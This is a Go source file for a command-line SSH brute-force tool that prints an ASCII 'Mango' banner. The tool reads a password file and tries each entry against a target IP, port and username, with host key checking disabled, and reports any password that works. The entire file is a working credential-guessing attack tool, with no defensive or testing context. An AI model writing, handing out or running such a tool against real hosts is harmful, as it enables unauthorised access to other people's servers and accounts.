package main

import (
	"bufio"
	"fmt"
	"log"
	"os"
	"time"

	"github.com/akamensky/argparse"
	"github.com/fatih/color"
	"golang.org/x/crypto/ssh"
)

func checkPassword(username string, password string, ip string, port string) bool {
	address := ip + ":" + port

	config := &ssh.ClientConfig{
		User: username,
		Auth: []ssh.AuthMethod{
			ssh.Password(password),
		},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
	}

	client, err := ssh.Dial("tcp", address, config)
	if err != nil {
		return false
	}

	log.Println(string(client.ClientVersion()))

	return true
}

func main() {
	parser := argparse.NewParser("quietly-go", "ssh brute force")

	var targetIP *string = parser.String("i", "ip", &argparse.Options{Required: true, Help: "IP to target"})
	var port *string = parser.String("p", "port", &argparse.Options{Required: false, Help: "Port", Default: "22"})

	var username *string = parser.String("u", "username", &argparse.Options{Required: true, Help: "Username to bruteforce"})
	var passwordFile *string = parser.String("", "password-file", &argparse.Options{Required: true, Help: "Path to file of passwords"})

	err := parser.Parse(os.Args)
	if err != nil {
		log.Fatal(err)
	}

	startTime := time.Now()

	// Add all passwords to slice
	file, err := os.Open(*passwordFile)
	if err != nil {
		log.Fatal(err)
	}
	defer file.Close()

	sc := bufio.NewScanner(file)

	var passwordsToCheck []string
	for sc.Scan() {
		passwordsToCheck = append(passwordsToCheck, sc.Text())
	}

	// Print Starting banner
	fmt.Println(`
	888b     d888        d8888 888b    888  .d8888b.   .d88888b.  
	8888b   d8888       d88888 8888b   888 d88P  Y88b d88P" "Y88b 
	88888b.d88888      d88P888 88888b  888 888    888 888     888 
	888Y88888P888     d88P 888 888Y88b 888 888        888     888 
	888 Y888P 888    d88P  888 888 Y88b888 888  88888 888     888 
	888  Y8P  888   d88P   888 888  Y88888 888    888 888     888 
	888   "   888  d8888888888 888   Y8888 Y88b  d88P Y88b. .d88P 
	888       888 d88P     888 888    Y888  "Y8888P88  "Y88888P"  
																  `)
	fmt.Println("Mango is targeting: " + *targetIP + ":" + *port)
	fmt.Println("Mango Started at: ", startTime.Format(time.UnixDate))

	for _, pw := range passwordsToCheck {
		if checkPassword(*username, pw, *targetIP, *port) {
			fmt.Println("Mango found a password: ")
			fmt.Print(*username + ":")
			color.Green(pw)
		}
	}
}
